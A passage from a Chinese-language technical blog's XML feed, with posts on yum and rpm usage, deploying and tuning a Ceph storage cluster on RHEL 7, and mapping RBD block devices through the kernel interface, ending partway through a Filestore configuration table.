<h4 id="使用downloadonly下载安装包"><a href="#使用downloadonly下载安装包" class="headerlink" title="使用downloadonly下载安装包"></a>使用downloadonly下载安装包</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install --downloadonly ceph-common --downloaddir=./</span><br><span class="line">yum install --downloadonly ceph --downloaddir=./</span><br><span class="line">yum install --downloadonly snappy leveldb gdisk python-argparse gperftools-libs --downloaddir=./</span><br></pre></td></tr></table></figure>
<p>详细见<a href="http://zhoubofsy.github.io/2016/04/13/yum-rpm-usage-md/">《yum和rpm使用方法》</a></p>
<h4 id="安装已下载的rpm包"><a href="#安装已下载的rpm包" class="headerlink" title="安装已下载的rpm包"></a>安装已下载的rpm包</h4><p>进入rpm包所在目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum localinstall *.rpm</span><br></pre></td></tr></table></figure>

<h2 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h2><hr>
<ul>
<li><a href="http://blog.csdn.net/wylfengyujiancheng/article/details/50418930">redhat7.2配置yum源</a></li>
<li><a href="https://github.com/ceph/ceph-kmod-rpm">README</a></li>
<li><a href="http://docs.ceph.com/docs/infernalis/install/install-storage-cluster/">Install Ceph Storage Cluster</a></li>
</ul>
]]></content>
      <categories>
        <category>rhel</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>rhel7</tag>
        <tag>yum</tag>
      </tags>
  </entry>
  <entry>
    <title>yum 和 rpm 使用方法总结</title>
    <url>/2016/04/13/linux/rhel/yum-rpm-usage-md/</url>
    <content><![CDATA[<h2 id="yum"><a href="#yum" class="headerlink" title="yum"></a>yum</h2><hr>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install &#123;软件名称&#125;</span><br></pre></td></tr></table></figure>

<h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum search &#123;关键字s&#125;</span><br></pre></td></tr></table></figure>

<h3 id="下载-不安装"><a href="#下载-不安装" class="headerlink" title="下载(不安装)"></a>下载(不安装)</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install --downloadonly &#123;需要下载的软件名，可多个&#125; --downloaddir=&#123;下载位置，目录名&#125;</span><br></pre></td></tr></table></figure>

<h3 id="按依赖关系安装本地rpm包"><a href="#按依赖关系安装本地rpm包" class="headerlink" title="按依赖关系安装本地rpm包"></a>按依赖关系安装本地rpm包</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum localinstall *.rpm</span><br></pre></td></tr></table></figure>

<h3 id="查看包版本"><a href="#查看包版本" class="headerlink" title="查看包版本"></a>查看包版本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum list &#123;安装包名称&#125; --showduplicates</span><br></pre></td></tr></table></figure>

<h3 id="安装指定版本的rpm包"><a href="#安装指定版本的rpm包" class="headerlink" title="安装指定版本的rpm包"></a>安装指定版本的rpm包</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install &#123;安装包名称&#125;-&lt;VERSION_STRING&gt;</span><br></pre></td></tr></table></figure>
<p>eg: <code>yum install ceph-13.2.6-0.el7</code></p>
<h2 id="rpm"><a href="#rpm" class="headerlink" title="rpm"></a>rpm</h2><hr>
<ul>
<li>每个rpm包上记录着它所依赖的rpm包</li>
</ul>
<h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rpm -ivh &#123;xxx.rpm&#125;</span><br></pre></td></tr></table></figure>

<h3 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rpm -e --nodeps &#123;软件名称&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>卸载软件包，但不卸载依赖包</li>
</ul>
<h3 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rpm2cpio &#123;xxx.rpm&#125; | cpio -div</span><br></pre></td></tr></table></figure>

<h3 id="查看包依赖关系"><a href="#查看包依赖关系" class="headerlink" title="查看包依赖关系"></a>查看包依赖关系</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rpm -qpR &#123;软件名称&#125;</span><br></pre></td></tr></table></figure>


<h2 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h2><hr>
<ul>
<li><a href="https://linux.cn/article-5100-1.html">如何使用yum来下载RPM包而不进行安装</a></li>
<li><a href="http://www.linuxeden.com/html/softuse/20090703/66563.html">实用小命令:解压RPM</a></li>
</ul>
]]></content>
      <categories>
        <category>rhel</category>
      </categories>
      <tags>
        <tag>yum</tag>
        <tag>rpm</tag>
      </tags>
  </entry>
  <entry>
    <title>在RHEL7.2平台上搭建ceph集群</title>
    <url>/2016/04/15/storage/ceph/20160415_ceph-install-deploy-config-on-rhel7-md/</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>ceph 分布式统一存储</p>
<h2 id="ceph-架构"><a href="#ceph-架构" class="headerlink" title="ceph 架构"></a>ceph 架构</h2><h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><ul>
<li>OS版本，RHEL 7.2 </li>
<li>Ceph版本，Infernalis</li>
</ul>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><ul>
<li>使用本地rpm包安装ceph及ceph依赖的软件包<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum localinstall *.rpm</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><h2 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">              +------------------------------------------------+</span><br><span class="line">              |                 Client Requests                |</span><br><span class="line">              +------------------------------------------------+</span><br><span class="line">                      /\                             /\</span><br><span class="line">           Admin Ops /||\                           /||\</span><br><span class="line">                      ||                             ||</span><br><span class="line">           ClusterMap ||                             ||  Data I/O</span><br><span class="line">                     \||/                           \||/</span><br><span class="line">                      \/                             \/</span><br><span class="line">+-----+       +----------------+            +------------------+</span><br><span class="line">|     |------&gt;|  MON (Active)  | &lt;-------&gt;  |                  |</span><br><span class="line">|     |       +----------------+            |                  |</span><br><span class="line">|     |                                     |                  |</span><br><span class="line">|     |       +----------------+            |                  |</span><br><span class="line">| NTP |------&gt;|  MON (Standby) | &lt;-------&gt;  |       OSDs       |</span><br><span class="line">|     |       +----------------+            |                  |</span><br><span class="line">|     |              .                      |                  |</span><br><span class="line">|     |              .                      |                  |</span><br><span class="line">|     |              .                      |                  |</span><br><span class="line">|     |       +----------------+            |                  |</span><br><span class="line">|     |------&gt;|  MON (Standby) | &lt;-------&gt;  |                  |</span><br><span class="line">+-----+       +----------------+            +------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ceph集群包括两类节点，mon节点、OSD节点</p>
<h3 id="MON节点"><a href="#MON节点" class="headerlink" title="MON节点"></a>MON节点</h3><ul>
<li>MON节点与OSD节点比例为1&#x2F;4</li>
<li>MON节点分布在存储压力较小的主机中</li>
<li>两两节点不能分布在一台主机中</li>
<li>MON节点使用万兆网络</li>
<li>MON节点通过NTP同步时钟(详细请见<a href="#%E5%8F%82%E8%80%83">参考6</a>)</li>
</ul>
<h3 id="OSD节点"><a href="#OSD节点" class="headerlink" title="OSD节点"></a>OSD节点</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">+------+  +-------------+        +-----------+          +-------+        +------------+</span><br><span class="line">|      |  |             |------&gt; |    Data   | ------&gt;  |  XFS  | ----&gt;  | SAS Device |</span><br><span class="line">|      |  |             |        +-----------+          +-------+        +------------+</span><br><span class="line">|      |  |             |</span><br><span class="line">|      |  | OSD1 Daemon |</span><br><span class="line">| One  |  |             |        +-----------+          +-------+        +------------+</span><br><span class="line">|      |  |             |------&gt; |  Journal  | -----+   |       |        |            |</span><br><span class="line">|      |  +-------------+        +-----------+      |   |       |        |            |</span><br><span class="line">| host |                                            +-&gt; |       |        |            |</span><br><span class="line">|      |                                            |   |  XFS  | ----&gt;  | SSD Device |</span><br><span class="line">|      |  +-------------+        +-----------+      |   |       |        |            |</span><br><span class="line">|      |  |             |------&gt; |  Journal  | -----+   |       |        |            |</span><br><span class="line">|      |  |             |        +-----------+          +-------+        +------------+</span><br><span class="line">|      |  |             |</span><br><span class="line">|      |  | OSDn Daemon |</span><br><span class="line">|      |  |             |        +-----------+          +-------+        +------------+</span><br><span class="line">|      |  |             |------&gt; |    Data   | ------&gt;  |  XFS  | ----&gt;  | SAS Device |</span><br><span class="line">+------+  +-------------+        +-----------+          +-------+        +------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>一个硬盘对应一个OSD Daemon</li>
<li>OSD节点使用万兆网络</li>
<li>数据与日志分开，日志存放在SSD硬盘中<br>数据写入先写入日志，再回写入数据，提高日志写入性能，可以提高性能<br>详细请见：<code>http://docs.ceph.com/docs/jewel/rados/configuration/osd-config-ref/</code></li>
<li>OSD使用XFS文件系统<br>生产环境使用XFS文件系统用于存储数据和日志<br>详细请见：<code>http://docs.ceph.com/docs/jewel/rados/configuration/filesystem-recommendations/</code></li>
</ul>
<h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><ul>
<li>public Network<br>采用万兆网，主要负责处理用户I&#x2F;O请求</li>
<li>Cluster Network<br>采用万兆网络， 主要负责拷贝数据副本和传递心跳信息</li>
</ul>
<p>详细请见：<code>http://docs.ceph.com/docs/jewel/rados/configuration/network-config-ref/</code></p>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="创建并使用ceph用户"><a href="#创建并使用ceph用户" class="headerlink" title="创建并使用ceph用户"></a>创建并使用ceph用户</h4><ul>
<li>创建ceph专属用户——ceph  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">useradd -Um -d /home/ceph ceph</span><br><span class="line">passwd ceph</span><br><span class="line">echo &quot;ceph  ALL=(ALL)   ALL&quot; &gt;&gt; /etc/sudoers</span><br><span class="line">su - ceph</span><br></pre></td></tr></table></figure>
<ol>
<li>创建ceph用户和ceph用户目录</li>
<li>修改ceph用户密码</li>
<li>修改ceph用户sudoer列表</li>
<li>切换ceph用户</li>
</ol>
</li>
<li>使用ceph用户配置环境<ol>
<li>修改主机名称</li>
<li>修改hosts文件，对应ip地址与主机名</li>
<li>本地安装ceph rpm包  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum localinstall *.rpm</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
<h4 id="SSH无密码访问"><a href="#SSH无密码访问" class="headerlink" title="SSH无密码访问"></a>SSH无密码访问</h4><ul>
<li>各个物理节点之间，建立SSH无密码访问</li>
</ul>
<h4 id="集群搭建"><a href="#集群搭建" class="headerlink" title="集群搭建"></a>集群搭建</h4><h5 id="MON节点搭建步骤"><a href="#MON节点搭建步骤" class="headerlink" title="MON节点搭建步骤"></a>MON节点搭建步骤</h5><ol>
<li>fsid生成</li>
<li>修改ceph.conf中的MON信息</li>
<li>创建并倒入admin keyring</li>
<li>创建MON数据目录</li>
<li>初始化MON节点</li>
<li>启动MON服务</li>
</ol>
<h5 id="OSD节点搭建步骤"><a href="#OSD节点搭建步骤" class="headerlink" title="OSD节点搭建步骤"></a>OSD节点搭建步骤</h5><ol>
<li>在集群中创建OSD</li>
<li>创建OSD数据目录</li>
<li>格式化硬盘文件系统为XFS</li>
<li>挂载硬盘到数据目录</li>
<li>初始化OSD节点</li>
<li>创建OSD访问需要的keyring</li>
<li>在Crushmap中添加OSD节点</li>
<li>修改ceph.conf中的OSD息</li>
<li>启动OSD服务</li>
</ol>
<p>详细请见：<a href="http://docs.ceph.com/docs/jewel/install/manual-deployment/">http://docs.ceph.com/docs/jewel/install/manual-deployment/</a></p>
<p><strong>注意：</strong></p>
<ul>
<li>按官网配置方式配置ceph集群（确保“&#x2F;var&#x2F;lib&#x2F;ceph&#x2F;”目录下的owner为ceph用户）</li>
<li>如果集群名称不是默认名称（默认名称为：ceph），需要修改&#x2F;etc&#x2F;sysconfig&#x2F;ceph，增加 CLUSTER&#x3D;”新集群名称”(详细请见，参考5)</li>
<li>根据集群情况结合本机需要启动的服务，在“&#x2F;etc&#x2F;sysconfig&#x2F;ceph”中增加 MON_ID&#x3D;”MON的ID” 或 OSD_ID&#x3D;”OSD的ID”(详细请见，参考5)</li>
<li>修改&#x2F;etc&#x2F;fstab，增加需要挂载的磁盘信息</li>
<li>修改systemd中ceph服务为enable，保证开机启动<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl enable ceph-mon@&#123;MON ID&#125;</span><br><span class="line">systemctl enable ceph-osd@&#123;OSD ID&#125;</span><br><span class="line">systemctl enable ceph-mon.target</span><br><span class="line">systemctl enable ceph-osd.target</span><br></pre></td></tr></table></figure>
大括号中的内容需要根据实际情况填写。</li>
</ul>
<h2 id="至此基本ceph集群已搭建完成"><a href="#至此基本ceph集群已搭建完成" class="headerlink" title="至此基本ceph集群已搭建完成"></a>至此基本ceph集群已搭建完成</h2><p>一个华丽的分割之后开始漫长的优化之路</p>
<h1 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h1><p>详细请见：<br><a href="http://zhoubofsy.github.io/2016/06/02/20160602-osd-node-optimize/">《OSD节点优化》</a>、<a href="http://zhoubofsy.github.io/2016/06/06/20160606-osd-config-optimize/">《Ceph集群OSD节点配置优化》</a></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://www.ustack.com/blog/build-block-storage-service/">打造高性能高可靠块存储系统</a></li>
<li><a href="http://stackoverflow.com/questions/32397704/cant-start-ceph-service">Can’t start ceph service</a></li>
<li><a href="http://www.jb51.net/article/45848.htm">linux命令详解之useradd命令使用方法</a></li>
<li><a href="http://serverfault.com/questions/681632/systemd-how-do-i-view-journals-with-journalctl-without-switching-to-root-on-cen">systemd:how do I view journals with journalctl without switching to root on CentOS7?</a></li>
<li><a href="http://permalink.gmane.org/gmane.comp.file-systems.ceph.devel/19988">Mail Re:Ceph on Fedora</a></li>
<li><a href="http://tecadmin.net/setup-ntp-server-on-centos-redhat/#">How to Setup NTP Server on CentOS&#x2F;RHEL 7&#x2F;6&#x2F;5 and Fedora 21&#x2F;20&#x2F;19</a></li>
</ol>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>rhel7</tag>
      </tags>
  </entry>
  <entry>
    <title>ceph Jewel 10.2.0 部署测试</title>
    <url>/2016/04/29/storage/ceph/20160429-jewel-of-ceph-deploy-test/</url>
    <content><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul>
<li>RHEL 7.2</li>
<li>ceph Jewel(10.2.0)</li>
</ul>
<h1 id="部署方法"><a href="#部署方法" class="headerlink" title="部署方法"></a>部署方法</h1><ul>
<li>基本部署方式与Infernalis版本相同（<a href="http://zhoubofsy.github.io/2016/04/15/20160415_ceph-install-deploy-config-on-rhel7-md/">《在RHEL7.2平台上搭建ceph集群》</a>）</li>
<li>其中OSD部署时，文件系统建议选择XFS，不能选择EXT4（EXT4，在OSD初始化时会报“File name too lang”错误）</li>
</ul>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://tracker.ceph.com/issues/15543">CEPH BUG #15543</a></li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>deploy</tag>
      </tags>
  </entry>
  <entry>
    <title>不使用ceph-common 进行内核映射 rbd 块设备</title>
    <url>/2016/04/27/storage/ceph/20160427-map-rbd-kernel-without-ceph-common-md/</url>
    <content><![CDATA[<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">modprobe rbd</span><br><span class="line">echo &quot;192.168.1.234 name=admin,secret=AQAHzRBX77ORERAAqfW0YAqq8+ETXMqWtPKwkQ== rbd testrbd&quot; &gt; /sys/bus/rbd/add</span><br><span class="line">echo 1 &gt; /sys/bus/rbd/remove</span><br></pre></td></tr></table></figure>

<p>如果你在执行<code>echo</code>时候提示参数错误，请现查看<code>modinfo rbd</code>看看里面的<code>single_major</code>默认值是否为<code>false</code><br>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">modinfo rbd</span></span><br><span class="line">filename:       /lib/modules/3.10.0-693.el7.x86_64/kernel/drivers/block/rbd.ko.xz</span><br><span class="line">license:        GPL</span><br><span class="line">description:    RADOS Block Device (RBD) driver</span><br><span class="line">author:         Jeff Garzik &lt;jeff@garzik.org&gt;</span><br><span class="line">author:         Yehuda Sadeh &lt;yehuda@hq.newdream.net&gt;</span><br><span class="line">author:         Sage Weil &lt;sage@newdream.net&gt;</span><br><span class="line">author:         Alex Elder &lt;elder@inktank.com&gt;</span><br><span class="line">rhelversion:    7.4</span><br><span class="line">srcversion:     B41E51769EC95E3DBDB16AB</span><br><span class="line">depends:        libceph</span><br><span class="line">intree:         Y</span><br><span class="line">vermagic:       3.10.0-693.el7.x86_64 SMP mod_unload modversions</span><br><span class="line">signer:         CentOS Linux kernel signing key</span><br><span class="line">sig_key:        DA:18:7D:CA:7D:BE:53:AB:05:BD:13:BD:0C:4E:21:F4:22:B6:A4:9C</span><br><span class="line">sig_hashalgo:   sha256</span><br><span class="line">parm:           single_major:Use a single major number for all rbd devices (default: false) (bool)</span><br></pre></td></tr></table></figure>
<p>如果<code>single_major</code>默认值为<code>ture</code>，那么在加载rbd模块时，需要将<code>single_major</code>设置成false<br>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">modprobe rbd single_major=0</span><br></pre></td></tr></table></figure>
<p>然后在重新执行<code>echo</code>。</p>
<h2 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h2><ul>
<li>192.168.1.234 为 Monitor 地址</li>
<li>name，制定使用的用户，可通过“ceph auth list” 查看</li>
<li>secret，name制定用户所对应的 key 值</li>
<li>rbd，制定需要映射的块设备（该快设备必须是已经创建好的）</li>
<li>使用客户端内核必须支持rbd.ko这个内核模块</li>
<li>1, 设备ID，用于去映射</li>
</ul>
<h2 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h2><ul>
<li><a href="http://cephnotes.ksperis.com/blog/2014/01/09/map-rbd-kernel-without-install-ceph-common">Map Rbd Kernel Without Install Ceph-common</a></li>
<li><a href="https://github.com/coreos/bugs/issues/2544">RBD failed to mount using rbd kernel module: tee: &#x2F;sys&#x2F;bus&#x2F;rbd&#x2F;add: Invalid argument #2544</a></li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>rbd</tag>
      </tags>
  </entry>
  <entry>
    <title>OSD 节点优化</title>
    <url>/2016/06/02/storage/ceph/20160602-osd-node-optimize/</url>
    <content><![CDATA[<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><ul>
<li>优化OSD节点性能</li>
<li>关闭OSD节点瓶颈项</li>
</ul>
<h1 id="优化项"><a href="#优化项" class="headerlink" title="优化项"></a>优化项</h1><h2 id="CPU-Status"><a href="#CPU-Status" class="headerlink" title="CPU Status"></a>CPU Status</h2><p>将cpu status 设置为 performance，可通过BIOS设置，或在系统中进行如下配置，修改后需要重启生效</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for CPUFREQ in /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor; do [ -f $CPUFREQ ] || continue; echo -n performance &gt; $CPUFREQ; done</span><br></pre></td></tr></table></figure>

<h2 id="Hyper-Threading（HT）"><a href="#Hyper-Threading（HT）" class="headerlink" title="Hyper-Threading（HT）"></a>Hyper-Threading（HT）</h2><p>开启VT和HT，在BIOS中配置</p>
<h2 id="NUMA"><a href="#NUMA" class="headerlink" title="NUMA"></a>NUMA</h2><p>关闭NUMA，可通过BIOS关闭，也可在加载Kernel是设置<br>打开<code>/etc/grub2-efi.cfg</code>，修改kernel加载部分，修改后需要重启生效</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">linuxefi /vmlinuz-3.10.0-327.el7.x86_64 root=/dev/mapper/rhel-root ro crashkernel=auto rd.lvm.lv=rhel/root rd.lvm.lv=rhel/swap rhgb quiet LANG=en_US.UTF-8 numa=off</span><br></pre></td></tr></table></figure>

<p>关闭前</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">lscpu | grep -i numa</span></span><br><span class="line">NUMA node(s):          2</span><br><span class="line">NUMA node0 CPU(s):     0-5,12-17</span><br><span class="line">NUMA node1 CPU(s):     6-11,18-23</span><br></pre></td></tr></table></figure>
<p>关闭后</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">lscpu | grep -i numa</span></span><br><span class="line">NUMA node(s):          1</span><br><span class="line">NUMA node0 CPU(s):     0-23</span><br></pre></td></tr></table></figure>
<h2 id="Jumbo-Frames"><a href="#Jumbo-Frames" class="headerlink" title="Jumbo Frames"></a>Jumbo Frames</h2><p>将cluster network 的网卡MTU设置为9000，修改后需要重启生效</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;MTU=9000&quot; | tee -a /etc/sysconfig/network-script/ifcfg-&#123;网卡&#125;</span><br></pre></td></tr></table></figure>

<p>通过ifconfig查看mtu修改情况</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ifconfig</span></span><br><span class="line">ens5f0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 9000</span><br><span class="line">        inet 192.168.43.5  netmask 255.255.255.0  broadcast 192.168.43.255</span><br><span class="line">        inet6 fe80::92e2:baff:febf:3800  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 90:e2:ba:bf:38:00  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 5218040  bytes 661253942 (630.6 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 5170015  bytes 605082933 (577.0 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>

<h2 id="SSD-Trim"><a href="#SSD-Trim" class="headerlink" title="SSD Trim"></a>SSD Trim</h2><p>为减少SSD写放大，需要开启Trim。<br>判断SSD是否支持Trim</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">hdparm -I /dev/&#123;SSD硬盘&#125; | grep -i trim</span></span><br><span class="line">          *    Data Set Management TRIM supported (limit 8 blocks)</span><br></pre></td></tr></table></figure>
<p>出现 “TRIM supported” 表示支持Trim，否则表示不支持Trim指令.</p>
<p>在xfs文件系统中开启trim指令，需要挂载xfs文件系统时，option中增加<code>discard</code></p>
<h2 id="Scheduler"><a href="#Scheduler" class="headerlink" title="Scheduler"></a>Scheduler</h2><p>硬盘I&#x2F;O调度机制配置，SSD 推荐采用“noop”，机械硬盘推荐采用“deadline”<br>修改<code>/etc/udev/rules.d/60-schedulers.rules</code>，增加如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">system default: <span class="built_in">set</span> cfq scheduler <span class="keyword">for</span> rotating disks</span></span><br><span class="line">ACTION==&quot;add|change&quot;,KERNEL==&quot;sd[a-z]&quot;,ATTR&#123;queue/rotational&#125;==&quot;1&quot;,ATTR&#123;queue/scheduler&#125;=&quot;deadline&quot;</span><br><span class="line">ACTION==&quot;add|change&quot;,KERNEL==&quot;sd[a-z]&quot;,ATTR&#123;queue/rotational&#125;==&quot;0&quot;,ATTR&#123;queue/scheduler&#125;=&quot;noop&quot;</span><br></pre></td></tr></table></figure>
<p>rotational 为 “1” 表示机械硬盘，为“0”表示SSD</p>
<p>查看修改是否生效</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /sys/block/&#123;硬盘&#125;/queue/scheduler</span><br></pre></td></tr></table></figure>

<h2 id="read-ahead-kb"><a href="#read-ahead-kb" class="headerlink" title="read_ahead_kb"></a>read_ahead_kb</h2><p>设置硬盘预读大小为8k<br>修改<code>/etc/udev/rules.d/60-schedulers.rules</code>，增加如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ACTION==&quot;add|change&quot;,KERNEL==&quot;sd[b-z]&quot;,ATTR&#123;queue/read_ahead_kb&#125;=&quot;8192&quot;</span><br></pre></td></tr></table></figure>

<p>查看是否生效</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /sys/block/&#123;硬盘&#125;/queue/read_ahead_kb</span><br></pre></td></tr></table></figure>

<h2 id="xfs-option"><a href="#xfs-option" class="headerlink" title="xfs option"></a>xfs option</h2><p>xfs 挂载增加如下option：</p>
<table>
<thead>
<tr>
<th></th>
<th align="center"></th>
</tr>
</thead>
<tbody><tr>
<td>rw</td>
<td align="center">允许读写操作</td>
</tr>
<tr>
<td>noexec</td>
<td align="center">不允许运行操作</td>
</tr>
<tr>
<td>nodev</td>
<td align="center">不支持设备文件</td>
</tr>
<tr>
<td>noatime</td>
<td align="center">不更新inode访问时间</td>
</tr>
<tr>
<td>nobarrier</td>
<td align="center">关闭cache 回写机制</td>
</tr>
</tbody></table>
<h2 id="FD-core-PID"><a href="#FD-core-PID" class="headerlink" title="FD,core &amp; PID"></a>FD,core &amp; PID</h2><h3 id="FD-core"><a href="#FD-core" class="headerlink" title="FD &amp; core"></a>FD &amp; core</h3><p>修改 max open files 最大值，系统默认是1024，将其修改为131072<br>修改 core 值，当程序崩溃时，会输出core文件，便于分析错误原因<br>修改<code>/etc/security/limits.conf</code>文件，增加：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">*   soft    core    10240</span><br><span class="line">*   soft    nofile  131072</span><br><span class="line">*   hard    nofile  131072</span><br></pre></td></tr></table></figure>
<p>修改后，可通过<code>ulimit -a</code>查看。</p>
<h3 id="PID"><a href="#PID" class="headerlink" title="PID"></a>PID</h3><p>修改pid max值，打破系统运行进程数量瓶颈，将其设置为4194303（系统默认是 32768）<br>修改<code>/etc/sysctl.conf</code>文件,增加<code>kernel.pid_max=4194303</code></p>
<h2 id="cgroup"><a href="#cgroup" class="headerlink" title="cgroup"></a>cgroup</h2><p>若集群搭建采用超融合方案（计算节点与存储节点混搭），使用cgroup将cpu与OSD进程绑定，减少cpu时间片切换次数，提高OSD相应速度</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://www.mylesgray.com/hardware/test-jumbo-frames-working/">How to test if 9000 MTU&#x2F;Jumbo Frames are working</a></li>
<li><a href="http://puremonkey2010.blogspot.tw/2014/10/linux-jumbo-frame.html">设置Jumbo frame</a></li>
<li><a href="http://ycnian.org/blog/archives/832">linux存储架构图</a></li>
<li><a href="http://my.oschina.net/manmao/blog/593851">linuxI&#x2F;O子系统框架图</a></li>
<li><a href="http://xiaoquqi.github.io/blog/2015/06/28/ceph-performance-optimization-summary/">Ceph性能优化总结（v.94）</a></li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>config</tag>
        <tag>osd</tag>
      </tags>
  </entry>
  <entry>
    <title>Ceph集群OSD节点配置优化</title>
    <url>/2016/06/06/storage/ceph/20160606-osd-config-optimize/</url>
    <content><![CDATA[<h1 id="OSD配置优化"><a href="#OSD配置优化" class="headerlink" title="OSD配置优化"></a>OSD配置优化</h1><h2 id="Filestore"><a href="#Filestore" class="headerlink" title="Filestore"></a>Filestore</h2><table>
<thead>
<tr>
<th>参数名</th>
<th align="left">描述</th>
<th align="right">默认值</th>
<th align="right">推荐值</th>
</tr>
</thead>
<tbody><tr>
<td>filestore max sync interval</td>
<td align="left">从日志到数据盘最大同步间隔(秒)</td>
<td align="right">5</td>
<td align="right">15</td>
</tr>
<tr>
<td>filestore min sync interval</td>
<td align="left">从日志到数据盘最小同步间隔(秒)</td>
<td align="right">0.1</td>
<td align="right">10</td>
</tr>
<tr>
<td>filestore queue max ops</td>
<td align="left">最大未完成io数</td>
<td align="right">50</td>
<td align="right">25000</td>
</tr>
<tr>
<td>filestore queue max bytes</td>
<td align="left">最大未完成io字节数(B)</td>
<td align="right">100 &lt;&lt; 20</td>
<td align="right">10 &lt;&lt; 20</td>
</tr>
<tr>
<td>filestore queue committing max ops</td>
<td align="left">数据盘能够commit的操作数</td>
<td align="right">500</td>
